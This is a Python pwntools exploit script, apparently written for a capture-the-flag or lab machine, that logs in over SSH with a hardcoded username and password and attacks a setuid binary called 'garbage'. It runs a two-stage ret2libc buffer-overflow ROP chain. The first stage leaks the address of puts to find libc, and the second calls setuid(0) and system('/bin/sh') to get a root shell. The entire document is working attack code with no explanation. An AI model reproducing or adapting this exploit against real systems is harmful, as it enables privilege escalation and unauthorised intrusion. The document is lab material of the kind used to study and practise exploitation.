from pwn import *

s=ssh(host="10.10.10.139",user="margo",password="iamgod$08")

elf  = ELF('./garbage')
libc = ELF('./libc.so.6')

p=s.process("/usr/bin/garbage")
#stage 1
padding="A"*136
pop_rdi=p64(0x40179b)
got_puts=p64(elf.got['puts'])
plt_puts=p64(elf.sym['puts'])
main=p64(0x401619)


payload= padding + pop_rdi+got_puts+plt_puts+main

p.recvuntil("password: ")
p.sendline(payload)
p.recvuntil("denied")
leaked_puts=p.recv()[1:8].strip().ljust(8, '\x00')
log.success('Leak: ' + hex(u64(leaked_puts)))

#stage 2
libc_system=0x4f440
libc_puts=libc.sym['puts']

libc.address=u64(leaked_puts) - libc_puts
log.success("base libc: "+ hex(libc.address))
log.success("system function at: "+ hex(libc.sym['system']))
log.success("/bin/sh string at: "+ hex(libc.search("/bin/sh").next()))

payload=padding+pop_rdi+p64(0)+p64(libc.sym['setuid'])+pop_rdi+p64(libc.search("/bin/sh").next())+p64(libc.sym['system'])

p.sendline(payload)
p.interactive()
